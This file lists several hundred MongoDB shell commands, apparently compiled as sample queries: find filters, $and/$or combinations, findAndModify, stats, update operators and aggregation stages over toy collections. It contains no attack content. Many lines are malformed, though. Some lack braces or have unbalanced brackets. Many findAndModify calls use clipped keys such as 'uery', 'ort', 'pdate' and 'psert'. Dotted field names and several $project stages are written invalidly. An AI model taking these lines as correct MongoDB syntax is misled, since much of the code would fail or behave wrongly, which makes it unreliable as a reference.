db.collection.find(quantity: { in_stock: {$gt: 8}, ordered: {$lte: 12}})
db.collection.find(quantity: { in_stock: {$gte: 8}, ordered: {$lte: 12}})
db.collection.find(quantity: { in_stock: {$lt: 8}, ordered: {$gt: 12}})
db.collection.find(quantity: { in_stock: {$lt: 8}, ordered: {$gte: 12}})
db.collection.find(quantity: { in_stock: {$lte: 8}, ordered: {$gt: 12}})
db.collection.find(quantity: { in_stock: {$lte: 8}, ordered: {$gte: 12}})
db.collection.find({product.ordered: {$lt: 400}}).pretty()
db.collection.find({product.ordered: {$gte: 120}}).pretty()
db.collection.find(quantity: { in_stock: {$gt: 8}, ordered: {$lt: 12}}).pretty()
db.collection.find(quantity: { in_stock: 8, ordered: 12 }).pretty()
db.collection.find(quantity: { in_stock: {$lt: 8}, ordered: 12 }).pretty()
db.collection.find({score: {$gte: 2}}).limit()
db.collection.find({score: {$gt: 1}}).limit()
db.collection.find({score: {$lte: 3}}).limit()
db.collection.find({product.ordered: "36"}).limit(10)
db.collection.find({product.ordered: {$gt: 30}}).limit(5)
db.collection.find(quantity: { in_stock: 8, ordered: {$gt: 12}}).limit(30)
db.collection.find(quantity: { in_stock: 8, ordered: {$gte: 12}}).limit(15)
db.collection.find({year: {$lt: 2020}}).sort( {year: 1} )
db.collection.find({year: {$ne: 2000}}).sort( {year: -1} )
db.collection.find(quantity: { in_stock: {$lt: 8}, ordered: 12 }).sort( {ordered: 1} )
db.collection.find(quantity: { in_stock: {$lte: 8}, ordered: 12 }).sort( {ordered: 1} )
db.collection.find({id: {$ne: 1}}).sort( {id: 1} ).pretty()
db.collection.find({id: {$lt: 100}}).sort( {id: -1} ).pretty()
db.collection.find({product.ordered: "36"}).limit(10).sort( {product.ordered: 1} )
db.collection.find({product.ordered: {$gt: 30}}).limit(5).sort( {product.ordered: -1} )
db.collection.find({age: {$gt: 30}}).limit(10).sort( {age: 1} )
db.collection.find({age: {$gte: 10, $lt: 30}}).limit(10).sort( {age: -1} )
db.collection.find({age: {$gt: 25, $lte: 45}}).limit(10).sort( {age: 1} )
db.collection.find({age: {$gte: 22, $lte: 57}}).limit(10).sort( {age: 1} ).pretty()
db.collection.find({score: {$lte: 3}}).limit().sort( {score: 1} )
db.collection.find({ $and: [{author: "William Shakespeare"}, {year: 1600}] })
db.collection.find({ $and: [{name: "john"}, {age: 35}] })
db.collection.find({ $and: [{name: "john"}, {city: "London"}] })
db.collection.find({ $and: [{product: "iPhone"}, {year: 2010}] })
db.collection.find({ $and: [{product.ordered: "20"}, {price: 19.99}] })
db.collection.find({ $and: [{name: "john"}, {age: {$lt: 35}}] })
db.collection.find({ $and: [{name: "john"}, {age: {$lte: 35}}] })
db.collection.find({ $and: [{name: "john"}, {age: {$gt: 35}}] })
db.collection.find({ $and: [{name: "john"}, {age: {$gte: 35}}] })
db.collection.find({ $and: [{name: "john"}, {age: {$ne: 35}}] })
db.collection.find({ $and: [{quantity: {$gt: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $and: [{quantity: {$gt: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $and: [{quantity: {$gte: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $and: [{quantity: {$gte: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $and: [{quantity: {$lt: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $and: [{quantity: {$lt: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $and: [{quantity: {$lte: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $and: [{quantity: {$lte: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $and: [{name: {$ne: "john"}}, {age: {$gt: 20}}] })
db.collection.find({ $and: [{name: {$ne: "john"}}, {age: {$gte: 20}}] })
db.collection.find({ $and: [{name: {$ne: "john"}}, {age: {$lt: 50}}] })
db.collection.find({ $and: [{name: {$ne: "john"}}, {age: {$lte: 50}}] })
db.collection.find({ $or: [{author: "William Shakespeare"}, {year: 1600}] })
db.collection.find({ $or: [{name: "john"}, {age: 35}] })
db.collection.find({ $or: [{name: "john"}, {city: "London"}] })
db.collection.find({ $or: [{product: "iPhone"}, {year: 2010}] })
db.collection.find({ $or: [{product.ordered: "20"}, {price: 19.99}] })
db.collection.find({ $or: [{name: "john"}, {age: {$lt: 35}}] })
db.collection.find({ $or: [{name: "john"}, {age: {$lte: 35}}] })
db.collection.find({ $or: [{name: "john"}, {age: {$gt: 35}}] })
db.collection.find({ $or: [{name: "john"}, {age: {$gte: 35}}] })
db.collection.find({ $or: [{name: "john"}, {age: {$ne: 35}}] })
db.collection.find({ $or: [{quantity: {$gt: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $or: [{quantity: {$gt: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $or: [{quantity: {$gte: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $or: [{quantity: {$gte: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $or: [{quantity: {$lt: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $or: [{quantity: {$lt: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $or: [{quantity: {$lte: 20}}, {price: {$lt: 100}}] })
db.collection.find({ $or: [{quantity: {$lte: 20}}, {price: {$lte: 100}}] })
db.collection.find({ $or: [{name: {$ne: "john"}}, {age: {$gt: 20}}] })
db.collection.find({ $or: [{name: {$ne: "john"}}, {age: {$gte: 20}}] })
db.collection.find({ $or: [{name: {$ne: "john"}}, {age: {$lt: 50}}] })
db.collection.find({ $or: [{name: {$ne: "john"}}, {age: {$lte: 50}}] })
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: 20 } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lte: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, {ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gte: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lte: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gte: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$lte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$gt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gt: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$gt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lte: 100} }, { color: "red" } ] },{ $or : [ { size: "M" }, { ordered: {$gte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$gte: 100} }, { color: "red" } ] }, { $or : [ { size: "M" }, { ordered: {$gte: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $or : [ { size: "M" }, { ordered: {$gt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $or : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ]} })
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: "red" ] }, { $or : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ]} }})
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $or : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ]} })
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $or : [ { size: {$ne: "M" }, { ordered: 100 } ] } ]} })
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $or : [ { size: {$ne: "M" }, { ordered: 100 } ] } ]} })
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: "red" ] }, { $or : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ]} }})
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: "red" ] }, { $or : [ { size: {$ne: "M" }, { ordered: 100 } ] } ]} }})
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: "red" ] }, { $or : [ { size: {$ne: "M" }, { ordered: 100 } ] } ]} }})
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $or : [ { size: "M" }, {ordered: {$gt: 100} } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $or : [ { size: "M" }, { ordered: 100 } ] } ]} )
db.inventory.find( { $and : [ { $or : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $or : [ { size: "M" }, { ordered: 100 } ] } ]} )
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: 20 } ] } ]} )
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $or : [ { $and : [ { price: {$lte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $or : [ { $and : [ { price: {$gt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lt: 100} } ] } ]} )
db.inventory.find( { $or : [ { $and : [ { price: {$gte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lt: 100} } ] } ] })
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$lte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$gt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$gte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$lte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$gt: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$gt: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$gt: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$lte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$gte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$gte: 100} }, { color: "red" } ] }, { $and : [ { size: "M" }, { ordered: {$gte: 100} } ] } ] }) 
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $and : [ { size: "M" }, { ordered: {$gt: 100} } ] } ] })
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $and : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ] }}) 
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: "red" ] }, { $and : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ] }}}) 
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $and : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ] }}) 
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $and : [ { size: {$ne: "M" }, { ordered: 100 } ] } ] }}) 
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $and : [ { size: {$ne: "M" }, { ordered: 100 } ] } ] }})
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: "red" ] }, { $and : [ { size: {$ne: "M" }, { ordered: {$gt: 100} } ] } ] }}})
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: "red" ] }, { $and : [ { size: {$ne: "M" }, { ordered: 100 } ] } ] }}})
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: "red" ] }, { $and : [ { size: {$ne: "M" }, { ordered: 100 } ] } ] }}})
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $and : [ { size: "M" }, { ordered: {$gt: 100} } ] } ] })
db.inventory.find( { $or : [ { $and : [ { price: {$lt: 100} }, { color: {$ne: "red"} } ] }, { $and : [ { size: "M" }, { ordered: 100 } ] } ] })
db.inventory.find( { $or : [ { $and : [ { price: 100 }, { color: {$ne: "red"} } ] }, { $and : [ { size: "M" }, { ordered: 100 } ] } ] })
db.car.findAndModify({ uery: { name: "Alto" }, ort: { cno: 1 }, pdate: { $inc: { speed: 10 } }})
db.car.findAndModify({ uery: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 }, ort: { cno: 1 }, pdate: { $inc: { speed: 20 } }, psert: true, ew: true })
db.restaurants1.findAndModify({ query: { name: "Douglaston Club" }, sort: { cuisine: 1 }, update: { $inc: { age: 1 } } });
db.restaurants1.findAndModify({ query: { name: "Douglaston Club" }, sort: { cuisine: 1 }, update: { $inc: { age: 1 } }, new : true });
db.restaurants1.findAndModify({ query: { name: "Douglaston Club" }, sort: { cuisine: 1 }, remove: true });
db.collection('counter').findAndModify({ query: { _id: name }, update: { $inc: { next: 1} }, new: true, upsert: true }, function(err, doc){ console.log('the id is: '+doc.next); });
db.restaurants1.findAndModify({ query: { name: "Douglaston Club" }, sort: { cuisine: 1 }, update: { $inc: { age: 1 } }, new : true, upsert: true });
db.restaurants1.findAndModify({ query: { name: "Douglaston Club" }, sort: { cuisine: 1 }, update: { $inc: { age: 1 } }, upsert: true });
db.car.findAndModify({ uery: { name: "Alto" }, ort: { cno: 1 }, pdate: { $inc: { speed: 10 } }, ew: true })
db.car.findAndModify({ uery: { name: "Alto" }, ort: { cno: 1 }, pdate: { $inc: { speed: 10 } }, psert: true })
db.car.findAndModify({ uery: { name: "Alto" }, ort: { cno: 1 }, pdate: { $inc: { speed: 10 } }, ew: true, psert: true })
db.car.findAndModify({ uery: { name: "Alto" }, ort: { cno: 1 }, emove: true })
db.car.findAndModify({ uery: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 }, ort: { cno: 1 }, pdate: { $inc: { speed: 20 } }, psert: true })
db.car.findAndModify({ uery: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 }, ort: { cno: 1 }, pdate: { $inc: { speed: 20 } }, ew: true })
db.car.findAndModify({ uery: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 }, ort: { cno: 1 }, pdate: { $inc: { speed: 20 } } })
db.car.findAndModify({ uery: { name: "HondaCity", color: "Silver", cno:"H415" ,speed: 25 }, ort: { cno: 1 }, emove: true })
db.restaurants.stats()
db.restaurants.stats( { scale : 1024 } )
db.restaurant.stats( { indexDetails : true } )
db.restaurants.stats( { indexDetails: true, indexDetailsKey: { borough: 1, cuisine: 1 } }) 
db.restaurants.stats( { indexDetails: true, indexDetailsName: 'borough_1_cuisine_1' } )
db.products.update( { sku: "unknown" }, { $unset: { quantity: "", instock: "" } } )
db.stores.update( { }, { $pull: { fruits: { $in: [ "apples", "oranges" ] }, vegetables: "carrots" } }, { multi: true } )
db.profiles.update( { _id: 1 }, { $pull: { votes: { $gte: 6 } } } )
db.survey.update( { }, { $pull: { results: { score: 8 , item: "B" } } }, { multi: true } )
db.survey.update( { }, { $pull: { results: { $elemMatch: { score: 8 , item: "B" } } } }, { multi: true } )
db.survey.update( { }, { $pull: { results: { answers: { $elemMatch: { q: 2, a: { $gte: 8 } } } } } }, { multi: true } )
db.survey.update( { _id: 1 }, { $pullAll: { scores: [ 0, 5 ] } } )
db.collection.update( { myArray: [ 5, 8 ] }, { $set: { myArray.$[]: 10 } }, { upsert: true } )
db.collection.update( { myArray: 5 }, { $set: { myArray.$[]: 10 } }, { upsert: true } )
db.collection.update( { }, { $set: { myArray.$[]: 10 } }, { upsert: true } )
db.students.update( { }, { $inc: { grades.$[]: 10 } }, { multi: true } )
db.students2.update( { }, { $inc: { grades.$[].std : -2 } }, { multi: true } )
db.results.update( { grades: { $ne: 100 } }, { $inc: { grades.$[]: 10 } }, { multi: true } )
db.students3.update( {}, { $inc: { grades.$[].questions.$[score]: 2 } }, { arrayFilters: [ { score: { $gte: 8 } } ], multi: true} )
db.students.updateOne( { _id: 1, grades: 80 }, { $set: { grades.$.std: 82 } } )
db.students.updateOne( { _id: 4, grades.grade: 85 }, { $set: { grades.$.std: 6 } } )
db.students.updateOne( { _id: 5, grades: { $elemMatch: { grade: { $lte: 90 }, mean: { $gt: 80 } } } }, { $set: { grades.$.std: 6 } } )
db.collection.update( { myArray: [ 0, 1 ] }, { $set: { myArray.$[element]: 2 } }, { arrayFilters: [ { element: 0 } ], upsert: true } )
db.array.update( { }, { $set: { myArray.$[element]: 10 } }, { arrayFilters: [ { element: 9 } ], upsert: true } )
db.students.update( { }, { $set: { grades.$[element]: 100 } }, { multi: true, arrayFilters: [ { element: { $gte: 100 } } ] } )
db.students2.update( { }, { $set: { grades.$[elem].mean: 100 } }, { multi: true, arrayFilters: [ { elem.grade: { $gte: 85 } } ] } )
db.students.update( { }, { $inc: { grades.$[elem].std: -1 } }, { arrayFilters: [ { elem.grade: { $gte: 80 }, elem.std: { $gt: 5 } } ], multi: true } )
db.alumni.update( { }, { $set : { degrees.$[degree].gradcampaign: 1 } }, { arrayFilters : [ {degree.level: { $ne: "Bachelor" } } ], multi : true } )
db.students3.update( {}, { $inc: { grades.$[t].questions.$[score]: 2 } }, { arrayFilters: [ { t.type: "quiz" } , { score: { $gte: 8 } } ], multi: true} )
db.students3.update( {}, { $inc: { grades.$[].questions.$[score]: 2 } }, { arrayFilters: [ { score: { $gte: 8 } } ], multi: true} )
db.collection.update( { _id.name: "Robert Frost", _id.uid: 0 }, { categories: ["poet", "playwright"] }, { upsert: true } )
db.books.update( { _id: 1 }, { $inc: { stock: 5 }, $set: { item: "ABC123", info.publisher: "2222", tags: [ "software" ], ratings.1: { by: "xyz", rating: 3 } } } )
db.books.update( { _id: 1 }, { $unset: { tags: 1 } } ) 
db.books.update({_id: 2, item: "XYZ123", stock: 15, info: { publisher: "5555", pages: 150 }, tags: [ ], ratings: [ { by: "xyz", rating: 5, comment: "ratings and reorder will go away after update"} ], reorder: false })
db.books.update( { item: "XYZ123" }, { item: "XYZ123", stock: 10, info: { publisher: "2255", pages: 150 }, tags: [ "baking", "cooking" ] } )
db.books.update( { item: "ZZZ135" }, { item: "ZZZ135", stock: 5, tags: [ "database" ] }, { upsert: true } )
db.books.update( { stock: { $lte: 10 } }, { $set: { reorder: true } }, { multi: true } )
db.books.update( { stock: { $lte: 10 } }, { $set: { reorder: true } }, { multi: true, writeConcern: { w: "majority", wtimeout: 5000 } } )
db.books.update( { item: "EFG222" }, { $set: { reorder: false, tags: [ "literature", "translated" ] } }, { upsert: true, multi: true } )
db.myColl.update( { category: "cafe" }, { $set: { status: "Updated" } }, { collation: { locale: "fr", strength: 1 } } );
db.students.update( { grades: { $gte: 100 } }, { $set: { grades.$[element]: 100 } }, { multi: true, arrayFilters: [ { element: { $gte: 100 } } ] } )
db.students2.update( { }, { $set: { grades.$[elem].mean: 100 } }, { multi: true, arrayFilters: [ { elem.grade: { $gte: 85 } } ] } )
db.orders.aggregate([ { $match: { status: "A" } }, { $group: { _id: "$cust_id", total: { $sum: "$amount" } } }, { $sort: { total: -1 } } ])
db.orders.aggregate( [ { $match: { status: "A" } }, { $group: { _id: "$cust_id", total: { $sum: "$amount" } } }, { $sort: { total: -1 } } ], { explain: true } )
db.orders.aggregate( [ { $match: { status: "A" } }, { $group: { _id: "$cust_id", total: { $sum: "$amount" } } }, { $sort: { total: -1 } }, { $limit: 2 } ], { cursor: { batchSize: 0 } } )
db.myColl.aggregate( [ { $match: { status: "A" } }, { $group: { _id: "$category", count: { $sum: 1 } } } ], { collation: { locale: "fr", strength: 1 } } );
db.foodColl.aggregate( [ { $sort: { qty: 1 }}, { $match: { category: "cake", qty: 10 } }, { $sort: { type: -1 } } ], { hint: { qty: 1, category: 1 } } )
db.restaurants.aggregate( [ { $match: { rating: { $lt: 5 } } } ], { readConcern: { level: "majority" } } )
db.movies.aggregate( [ { $match: { year : 1995 } } ], { comment : "match_all_movies_from_1995" } ).pretty()
db.system.profile.find( { command.aggregate: "movies", command.comment: "match_all_movies_from_1995" } ).sort( { ts : -1 } ).pretty() 
db.products.update ({_id: 1, sku: "abc123", quantity: 10, metrics: { orders: 2, ratings: 3.5 } })
db.products.update( { sku: "abc123" }, { $inc: { quantity: -2, metrics.orders: 1 } } )
db.scores.update( { _id: 1 }, { $min: { lowScore: 150 } } )
db.scores.update( { _id: 1 }, { $min: { lowScore: 250 } } )
db.tags.update( { _id: 1 }, { $min: { dateEntered: new Date("2013-09-25") } } )
db.scores.update( { _id: 1 }, { $max: { highScore: 950 } } )
db.scores.update( { _id: 1 }, { $max: { highScore: 870 } } )
db.tags.update( { _id: 1 }, { $max: { dateExpired: new Date("2013-09-30") } } )
db.products.update( { _id: 1 }, { $mul: { price: 1.25 } } )
db.products.update( { _id: 2 }, { $mul: { price: NumberLong(100) } } )
db.products.update( { _id: 3 }, { $mul: { price: NumberInt(5) } } )
db.students.update( { _id: 1 }, { $rename: { nickname: 'alias', cell: 'mobile' } } )
db.students.update( { _id: 1 }, { $rename: { wife: 'spouse' } } )
db.products.update( { _id: 100 }, { $set: { quantity: 500, details: { model: "14Q3", make: "xyz" }, tags: [ "coats", "outerwear", "clothing" ] } } )
db.products.update( { _id: 100 }, { $set: { details.make: "zzz" } } )
db.products.update( { _id: 100 }, { $set: { tags.1: "rain gear", ratings.0.rating: 2 } } )
db.ratings.aggregate([ { $project: { delta: { $abs: { $subtract: [ "$start", "$end" ] } } } } ])
db.sales.aggregate( [ { $project: { item: 1, total: { $add: [ "$price", "$fee" ] } } } ] )
db.sales.aggregate( [ { $project: { item: 1, billing_date: { $add: [ "$date", 3*24*60*60000 ] } } } ] )
db.sales.aggregate( [ { $group: { _id: { day: { $dayOfYear: "$date"}, year: { $year: "$date" } }, itemsSold: { $addToSet: "$item" } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, result: { $and: [ { $gt: [ "$qty", 100 ] }, { $lt: [ "$qty", 250 ] } ] } } } ] )
db.users.aggregate([ { $project: { name: 1, first: { $arrayElemAt: [ "$favorites", 0 ] }, last: { $arrayElemAt: [ "$favorites", -1 ] } } } ])
db.inventory.aggregate( [ { $project: { item: 1, dimensions: { $arrayToObject: "$dimensions" } } } ] )
db.inventory.aggregate( [ { $addFields: { instock: { $objectToArray: "$instock" } } }, { $addFields: { instock: { $concatArrays: [ "$instock", [ { k: "total", v: { $sum: "$instock.v" } } ] ] } } } , { $addFields: { instock: { $arrayToObject: "$instock" } } } ])
db.students.aggregate([ { $project: { quizAvg: { $avg: "$quizzes"}, labAvg: { $avg: "$labs" }, examAvg: { $avg: [ "$final", "$midterm" ] } } } ])
db.samples.aggregate([ { $project: { value: 1, ceilingValue: { $ceil: "$value" } } } ])
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, cmpTo250: { $cmp: [ "$qty", 250 ] }, _id: 0 } } ] )
db.warehouses.aggregate([ { $project: { items: { $concatArrays: [ "$instock", "$ordered" ] } } } ])
db.inventory.aggregate( [ { $project: { item: 1, discount: { $cond: { if: { $gte: [ "$qty", 250 ] }, then: 30, else: 20 } } } } ] )
db.inventory.aggregate( [ { $project: { item: 1, discount: { $cond: [ { $gte: [ "$qty", 250 ] }, 30, 20 ] } } } ] )
db.sales.aggregate([  $project: { nycHour: { $hour: { date: "$date", timezone: "-05:00" } }, nycMinute: { $minute: { date: "$date", timezone: "-05:00" } }, gmtHour: { $hour: { date: "$date", timezone: "GMT" } }, gmtMinute: { $minute: { date: "$date", timezone: "GMT" } }, nycOlsonHour: { $hour: { date: "$date", timezone: "America/New_York" } }, nycOlsonMinute: { $minute: { date: "$date", timezone: "America/New_York" } } } ])
db.sales.aggregate([  $project: { date: { $dateFromParts: { year: 2017, month: 2, day: 8, hour: 12 } }, date_iso: { $dateFromParts: { isoWeekYear: 2017, isoWeek: 6, isoDayOfWeek: 3, hour: 12 } }, date_timezone: { $dateFromParts: { year: 2016, month: 12, day: 31, hour: 23, minute: 46, second: 12, timezone: 'America/New_York' } } } ])
db.sales.aggregate([ { $project: { date: { $dateToParts: { date: "$date" } }, date_iso: { $dateToParts: { date: "$date", iso8601: true } }, date_timezone: { $dateToParts: { date: "$date", timezone: "America/New_York" } } } }])
db.logmessages.aggregate( [ { $project: { date: { $dateFromString: { dateString: '$date', timezone: 'America/New_York' } } }  }] )
db.logmessages.aggregate( [ { $project: { date: { $dateFromString: { dateString: '$date', timezone: '$timezone' } } } } ] )
db.sales.aggregate( [ { $project: { yearMonthDayUTC: { $dateToString: { format: "%Y-%m-%d", date: "$date" } }, timewithOffsetNY: { $dateToString: { format: "%H:%M:%S:%L%z", date: "$date", timezone: "America/New_York"} }, timewithOffset430: { $dateToString: { format: "%H:%M:%S:%L%z", date: "$date", timezone: "+04:30" } }, minutesOffsetNY: { $dateToString: { format: "%Z", date: "$date", timezone: "America/New_York" } }, minutesOffset430: { $dateToString: { format: "%Z", date: "$date", timezone: "+04:30" } } } } ] )
db.sales.aggregate( [ { $project: { year: { $year: "$date" }, month: { $month: "$date" }, day: { $dayOfMonth: "$date" }, hour: { $hour: "$date" }, minutes: { $minute: "$date" }, seconds: { $second: "$date" }, milliseconds: { $millisecond: "$date" }, dayOfYear: { $dayOfYear: "$date" }, dayOfWeek: { $dayOfWeek: "$date" }, week: { $week: "$date" } } } ] )
db.planning.aggregate( [ { $project: { name: 1, workdays: { $divide: [ "$hours", 8 ] } } } ] )
db.collection.aggregate([ { $group: { _id: { checkType: "$_id.checkType", resultCode: "$_id.resultCode" }, count: { $sum: "$count" }, ctv: { $sum: "$ctv" }, details: { $push: "$$ROOT" } } }, { $project: { count: 1, details: 1, ctv: 1, perc: { $multiply: [ { $divide: ["$ctv","$count"] }, 100 ] }, weight: { $divide: [$ctv, "$count"] }, } } ])
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyEq250: { $eq: [ "$qty", 250 ] }, _id: 0 } } ] )
db.accounts.aggregate( [ { $project: { effectiveRate: { $subtract: [ { $exp: "$rate"}, 1 ] } } } ] ) 
db.accounts.aggregate({ $filter: { input: [ 1, "a", 2, null, 3.1, NumberLong(4), "5" ], as: "num", cond: { $and: [ { $gte: [ "$$num", NumberLong("-9223372036854775807") ] }, { $lte: [ "$$num", NumberLong("9223372036854775807") ] } ] } } })
db.sales.aggregate( [ { $sort: { item: 1, date: 1 } }, { $group: { _id: "$item", firstSalesDate: { $first: "$date" } } } ] )
db.samples.aggregate([ { $project: { value: 1, floorValue: { $floor: "$value" } } } ])
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyGt250: { $gt: [ "$qty", 250 ] }, _id: 0 } } ] )
db.inventory.aggregate( [ { $project: { item: 1, qty: 1, qtyGte250: { $gte: [ "$qty", 250 ] }, _id: 0 } } ] )
db.inventory.aggregate( [ { $project: { item: 1, description: { $ifNull: [ "$description", "Unspecified" ] } } } ] )
db.fruit.aggregate([ { $project: { store_location: "$location", has_bananas: { $in: [ "bananas", "$in_stock" ] } } } ])
db.inventory.aggregate( [ { $project: { index: { $indexOfArray: [ "$items", 2 ] }, } } ] )
db.inventory.aggregate( [ { $project: { byteLocation: { $indexOfBytes: [ "$item", "foo" ] }, } } ] )
db.inventory.aggregate( [ { $project: { cpLocation: { $indexOfCP: [ "$item", "foo" ] }, } } ] )
db.warehouses.aggregate([ { $project: { items: { $cond: { if: { $and: [ { $isArray: "$instock" }, { $isArray: "$ordered" } ] }, then: { $concatArrays: [ "$instock", "$ordered" ] }, else: "One or more fields is not an array." } } } } ])
db.dates.aggregate( [ { $project: { _id: 0, name: "$name", dayOfWeek: { $isoDayOfWeek: "$birthday" } } } ] )
db.deliveries.aggregate( [ { $project: { _id: 0, city: "$city", weekNumber: { $isoWeek: "$date" } } } ] )
db.anniversaries.aggregate( [ { $project: { yearNumber: { $isoWeekYear: "$date" } } } ] )
db.sales.aggregate( [ { $sort: { item: 1, date: 1 } }, { $group: { _id: "$item", lastSalesDate: { $last: "$date" } } } ] )
db.sales.aggregate( [ { $project: { finalTotal: { $let: { vars: { total: { $add: [ '$price', '$tax' ] }, discounted: { $cond: { if: '$applyDiscount', then: 0.9, else: 1 } } }, in: { $multiply: [ "$$total", "$$discounted" ] } } } } } ] )
db.records.aggregate( [ { $project: { costsOneDollar: { $eq: [ "$price", { $literal: "$1" } ] } } } ] )
